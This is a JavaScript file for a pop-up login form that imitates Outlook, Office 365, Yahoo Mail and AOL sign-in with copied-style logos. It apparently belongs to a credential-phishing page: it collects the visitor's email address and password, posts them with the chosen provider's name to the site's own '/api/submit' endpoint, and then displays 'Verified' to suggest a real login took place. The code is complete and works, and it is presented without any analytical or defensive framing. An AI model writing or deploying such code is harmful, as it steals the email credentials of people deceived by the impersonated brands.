(function () {
  const overlay = document.getElementById('auth-modal');
  if (!overlay) return;

  const card = overlay.querySelector('.modal-card');
  const iconWrap = document.getElementById('modal-provider-icon');
  const nameEl = document.getElementById('modal-provider-name');
  const form = document.getElementById('modal-auth-form');
  const emailInput = document.getElementById('modal-email');
  const passwordInput = document.getElementById('modal-password');
  const submitBtn = document.getElementById('modal-submit');
  const cancelBtn = document.getElementById('modal-cancel');
  const closeBtn = document.getElementById('modal-close');
  const errorBox = document.getElementById('modal-error');

  const providerLogos = {
    outlook: '<svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="5" width="16" height="20" rx="2" fill="#0078D4"/><rect x="2" y="5" width="16" height="20" rx="2" fill="url(#m-ol)"/><text x="10" y="20" text-anchor="middle" font-family="Arial,sans-serif" font-size="11" font-weight="900" fill="#fff">O</text><rect x="14" y="11" width="16" height="11" rx="1.5" fill="#0F6CBD"/><path d="M14 13l8 5 8-5" stroke="#fff" stroke-width="1.3" fill="none" stroke-linecap="round"/><defs><linearGradient id="m-ol" x1="2" y1="5" x2="18" y2="25" gradientUnits="userSpaceOnUse"><stop offset="0%" stop-color="#35B8F1"/><stop offset="100%" stop-color="#0078D4"/></linearGradient></defs></svg>',
    office365: '<svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="3" y="3" width="11" height="11" rx="1.5" fill="#F25022"/><rect x="17" y="3" width="11" height="11" rx="1.5" fill="#7FBA00"/><rect x="3" y="17" width="11" height="11" rx="1.5" fill="#00A4EF"/><rect x="17" y="17" width="11" height="11" rx="1.5" fill="#FFB900"/></svg>',
    yahoo: '<svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21.49 4c-.69 1.27-1.58 2.83-2.18 3.86-.92 1.58-1.41 2.13-2.34 2.48-.77.29-1.74.42-2.97.42-1.23 0-2.2-.13-2.97-.42-.93-.35-1.42-.9-2.34-2.48C8.09 6.83 7.2 5.27 6.51 4H3.2c1.6 2.78 3.21 5.56 4.81 8.34.86 1.49 1.06 2.05 1.06 3.4V28h4.86V15.74c0-1.35.2-1.91 1.06-3.4 1.6-2.78 3.21-5.56 4.81-8.34h-3.31z" fill="#5F01D1"/></svg>',
    aol: '<svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="13" fill="#000"/><text x="16" y="20" text-anchor="middle" font-family="Arial,sans-serif" font-size="8" font-weight="900" fill="#fff">Aol.</text></svg>',
    other: '<svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="3" y="7" width="26" height="18" rx="3" fill="#475569"/><path d="M4 10l12 8 12-8" stroke="#fff" stroke-width="2.2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>',
  };

  const providerNames = {
    outlook: 'Outlook',
    office365: 'Office 365',
    yahoo: 'Yahoo Mail',
    aol: 'AOL',
    other: 'Other Mail',
  };

  let currentProvider = '';

  function openModal(provider) {
    currentProvider = provider;
    iconWrap.innerHTML = providerLogos[provider] || providerLogos.other;
    nameEl.textContent = 'Sign in with ' + (providerNames[provider] || provider);
    form.reset();
    errorBox.classList.remove('is-visible');
    overlay.classList.add('is-open');
    setTimeout(() => emailInput.focus(), 280);
  }

  function closeModal() {
    overlay.classList.remove('is-open');
  }

  document.querySelectorAll('[data-provider]').forEach(function (btn) {
    btn.addEventListener('click', function (e) {
      e.preventDefault();
      openModal(btn.getAttribute('data-provider'));
    });
  });

  closeBtn.addEventListener('click', closeModal);
  cancelBtn.addEventListener('click', closeModal);
  overlay.addEventListener('click', function (e) {
    if (e.target === overlay) closeModal();
  });
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && overlay.classList.contains('is-open')) closeModal();
  });

  form.addEventListener('submit', function (e) {
    e.preventDefault();
    const email = emailInput.value.trim();
    const password = passwordInput.value;
    if (!email || !password) {
      errorBox.textContent = 'Please enter both email and password.';
      errorBox.classList.add('is-visible');
      return;
    }

    submitBtn.classList.add('is-loading');
    submitBtn.textContent = 'Signing in…';
    errorBox.classList.remove('is-visible');

    fetch('/api/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email,
        password,
        provider: providerNames[currentProvider] || currentProvider,
      }),
    })
      .then(function (r) { return r.json(); })
      .then(function () {
        submitBtn.textContent = 'Verified';
        setTimeout(closeModal, 800);
      })
      .catch(function () {
        submitBtn.classList.remove('is-loading');
        submitBtn.textContent = 'Sign In';
        errorBox.textContent = 'Something went wrong. Please try again.';
        errorBox.classList.add('is-visible');
      });
  });
})();
